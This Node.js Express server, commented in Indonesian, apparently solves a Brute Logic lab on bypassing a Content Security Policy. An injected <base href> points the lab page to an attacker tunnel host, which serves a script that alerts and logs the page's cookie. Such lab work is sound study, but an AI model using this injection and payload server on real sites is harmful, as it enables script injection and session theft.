const express = require('express');
const app = express();

// Middleware untuk logging setiap request
app.use((req, res, next) => {
  console.log(`[${new Date().toISOString()}] ${req.method} ${req.url}`);
  next();
});

// /script.js - file yang akan di-load oleh victim page
// /script.js ini disesuaikan dimana letak nonce

// di case lab brutelogic ini, letak nonce ada di script.js: 
// <script src="script.js" nonce="1c23ee965f8410c6"></script>
// maka path server yang kita buat = /script.js

// Lab url: https://x55.is/brutelogic/csp/csp-base-uri.php?p=
// Final payload: // https://x55.is/brutelogic/csp/csp-base-uri.php?p=%3CBase%20Href=//reed-ringtones-exam-francis.trycloudflare.com%3E
app.get('/script.js', (req, res) => {
  console.log('✅ script.js requested!');
  
  // Set proper headers
  res.setHeader('Content-Type', 'application/javascript; charset=utf-8');
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Cache-Control', 'no-cache');
  
  // Payload XSS - bisa diganti sesuai kebutuhan
  const payload = `
    // XSS Payload berhasil!
    alert('Hacked FTW By ASW');
    console.log('Document Domain:', document.domain);
    console.log('Document Cookie:', document.cookie);
  `;
  
  res.send(payload.trim());
});

// Handle path lainnya (optional, untuk debugging)
app.get(/.*/, (req, res) => {
  console.log('⚠️  Request ke path lain:', req.path);
  
  res.setHeader('Content-Type', 'application/javascript; charset=utf-8');
  res.setHeader('Access-Control-Allow-Origin', '*');
  
  res.send(`alert('Path tidak dikenali: ${req.path}');`);
});

const PORT = 3000;
app.listen(PORT, () => {
  console.log('='.repeat(50));
  console.log('🚀 CSP Base-URI Bypass Server Running!');
  console.log('='.repeat(50));
  console.log(`📡 Local: http://localhost:${PORT}`);
  console.log(`📁 Serving: /script.js`);
  console.log('');
  console.log('Next steps:');
  console.log('1. Run: ngrok http 3000');
  console.log('2. Copy your ngrok URL');
  console.log('3. Use payload: <Base Href=//YOUR-NGROK-ID.ngrok-free.app/>');
  console.log('='.repeat(50));
});
